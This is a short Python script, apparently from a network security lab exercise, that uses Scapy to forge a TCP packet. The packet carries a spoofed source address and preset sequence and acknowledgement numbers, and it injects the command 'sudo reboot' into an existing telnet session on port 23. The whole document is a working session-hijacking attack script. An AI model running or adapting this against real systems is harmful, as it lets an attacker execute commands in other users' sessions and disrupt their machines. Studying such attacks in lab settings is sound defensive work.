from scapy.all import *
ip = IP(src="192.168.1.183", dst="192.168.1.223")
tcp = TCP(sport=54178, dport=23, flags=16, seq=3031328117, ack=272819065)
data = "\nsudo reboot\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)